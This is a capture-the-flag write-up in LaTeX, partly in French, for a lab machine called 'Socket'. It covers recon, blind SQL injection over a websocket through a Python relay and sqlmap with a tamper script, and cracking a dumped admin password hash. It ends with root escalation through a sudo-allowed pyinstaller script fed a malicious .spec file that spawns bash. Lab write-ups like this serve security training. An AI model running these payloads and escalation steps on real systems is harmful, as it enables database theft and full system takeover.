\chapter{Socket}
\begin{itemize}
    \item {\bf technics}: websocket sql injection
    \item {\bf Components}: pyinstaller
    \item {\bf tools}: websocat
\end{itemize}


\section{Recon}
\begin{verbatim}

$ nmapz 10.129.192.177
TCP ports found: 22,80,5789
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 23:35 CET
Nmap scan report for 10.129.192.177
Host is up (0.028s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://qreader.htb/
5789/tcp open  unknown
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Date: Sat, 25 Mar 2023 22:34:56 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
|   Help, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Date: Sat, 25 Mar 2023 22:35:11 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|_    Failed to open a WebSocket connection: did not receive a valid HTTP request.

\end{verbatim}

\section{http}

\begin{verbatim}
$ whatweb -v  http://qreader.htb
WhatWeb report for http://qreader.htb
Status    : 200 OK
Title     : <None>
IP        : 10.129.192.177
Country   : RESERVED, ZZ

Summary   : Bootstrap, Email[contact@qreader.htb], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], JQuery[3.4.1], Python[3.10.6], Script[text/javascript], Werkzeug[2.1.2], X-UA-Compatible[ie=edge]

\end{verbatim}

en scan rapide pas de subdomain 

\begin{verbatim}
[Status: 200, Size: 4161, Words: 878, Lines: 197, Duration: 90ms]
    * FUZZ: report

[Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 63ms]
    * FUZZ: reader

[Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 98ms]
    * FUZZ: embed
\end{verbatim}

test lfi sur generation qrcode via le site web


Embed you text 
\verb+/etc/passwd+ produit bien le text dans le qrcode quand on ajoute des
\verb+../+ en prefixe ca affiche toujours le text sauf lorsque l'on arrive
à \verb+../../../../../../../../etc/passwd+ le contenu est
vide.

test generation d'un qrcode malicieux via le client lourd avec lecture sur le
site web


ne donne pas grand chose

\section{5789}

\begin{verbatim}
$ curl -I http://qreader.htb:5789/
HTTP/1.1 400 Bad Request
Date: Sun, 26 Mar 2023 00:17:08 GMT
Server: Python/3.10 websockets/10.4
Content-Length: 77
Content-Type: text/plain
Connection: close

\end{verbatim}


\begin{verbatim}
$ websocat ws://qreader.htb:5789/
{"jubeaz": "jubeaz"}
{"paths": {"/update": "Check for updates", "/version": "Get version information"}}

$ websocat ws://qreader.htb:5789/version -v
[INFO  websocat::lints] Auto-inserting the line mode
[INFO  websocat::stdio_threaded_peer] get_stdio_peer (threaded)
[INFO  websocat::ws_client_peer] get_ws_client_peer
[INFO  websocat::ws_client_peer] Connected to ws
{"version": "3"}
[INFO  websocat::ws_peer] Received WebSocket close message
{"message": "Invalid version!"}


$ rlwrap websocat -t - autoreconnect:ws://qreader.htb:5789/update
{}
[WARN  websocat::reconnect_peer]
{"version": ""}
[WARN  websocat::reconnect_peer]
{"message": "Version 0.0.2 is available to download!"}
{"version": "0.0.2"}
{"message": "You have the latest version installed!"}

$ rlwrap websocat -t - autoreconnect:ws://qreader.htb:5789/version
{"version": "0.0.2"}
[WARN  websocat::reconnect_peer]
{"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
{"version": "0.0.1"}
[WARN  websocat::reconnect_peer]
{"message": {"id": 1, "version": "0.0.1", "released_date": "12/07/2022", "downloads": 280}}
{"version": "0.0.0"}
[WARN  websocat::reconnect_peer]
{"message": "Invalid version!"}
{"version": "0.0.1\""}
[WARN  websocat::reconnect_peer]
{"version": "0.0.1\"--"}
[WARN  websocat::reconnect_peer]
{"message": {"id": 1, "version": "0.0.1", "released_date": "12/07/2022", "downloads": 280}}
{"version": "0.0.3\" OR 1=1--"}
{"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
\end{verbatim}


on passe par le proxy
\url{https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html} que l'on adapte 
\begin{verbatim}
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://qreader.htb:5789/version"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	#message = unquote(payload).replace('"','\"') # replacing " with ' to avoid breaking JSON structure
	message = unquote(payload)
	data = '{"version":"%s"}' % message
	print(f'Sending: {data}')
	ws.send(data)
	resp = ws.recv()
	ws.close()
	# print(f'Receiving: {resp}')
	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?version=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
\end{verbatim}





donc on créé un tzmper pour sqlmap
\begin{verbatim}
return payload.replace("'", '\\\"')
\end{verbatim}


\begin{verbatim}
$ sqlmap -u "http://localhost:8081/?version=0.0.1" --batch --tamper=single2double
---
Parameter: version (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: version=0.0.1' AND 5652=5652 AND 'IKrF'='IKrF

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: version=0.0.1' AND 8751=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'EQZx'='EQZx

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: version=0.0.1' UNION ALL SELECT NULL,CHAR(113,122,118,113,113)||CHAR(114,98,77,105,100,68,109,114,68,119,73,117,76,105,116,102,79,76,105,88,120,87,86,111,74,69,90,103,73,67,106,77,80,110,104,109,106,113,68,76)||CHAR(113,120,107,98,113),NULL,NULL-- mMEI
---

\end{verbatim}


\begin{verbatim}
+-----------------+
| answers         |
| info            |
| reports         |
| sqlite_sequence |
| users           |
| versions        |
+-----------------+

+----+-------+----------------------------------+----------+
| id | role  | password                         | username |
+----+-------+----------------------------------+----------+
| 1  | admin | 0c090c365fa0559b151a43e0fea39710 | admin    |
+----+-------+----------------------------------+----------+


\end{verbatim}

\begin{verbatim}
$ name-that-hash --text 0c090c365fa0559b151a43e0fea39710

  _   _                           _____ _           _          _   _           _
 | \ | |                         |_   _| |         | |        | | | |         | |
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash


0c090c365fa0559b151a43e0fea39710

Most Likely
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach

\end{verbatim}



from crackstation:
\begin{verbatim}
0c090c365fa0559b151a43e0fea39710	md5	denjanjade122566
\end{verbatim}

dans anwser on trouve
\begin{verbatim}
Jason 
Mike
Thomas Keller

\end{verbatim}

denjanjade122566


\section{tkeller}

\begin{verbatim}
tkeller@socket:~$ sudo -l
Matching Defaults entries for tkeller on socket:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh

tkeller@socket:~$ cat /usr/local/sbin/build-installer.sh
#!/bin/bash
if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
  /usr/bin/echo "No enough arguments supplied"
  exit 1;
fi

action=$1
name=$2
ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')

if [[ -L $name ]];then
  /usr/bin/echo 'Symlinks are not allowed'
  exit 1;
fi

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'make' ]]; then
  if [[ $ext == 'py' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
   /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'cleanup' ]]; then
  /usr/bin/rm -r ./build ./dist 2>/dev/null
  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
  /usr/bin/rm /tmp/qreader* 2>/dev/null
else
  /usr/bin/echo 'Invalid action'
  exit 1;
fi

\end{verbatim}


\begin{verbatim}
After PyInstaller creates a spec file, or opens a spec file when one is given
instead of a script, the pyinstaller command executes the spec file as code.
\end{verbatim}

test.spec:
\begin{verbatim}
 import os;os.system("/bin/bash")
\end{verbatim}


\begin{verbatim}
$ sudo /usr/local/sbin/build-installer.sh build /home/tkeller/test.spec
146 INFO: PyInstaller: 5.6.2
146 INFO: Python: 3.10.6
148 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
149 INFO: UPX is not available.
root@socket:/home/tkeller/test# l
\end{verbatim}

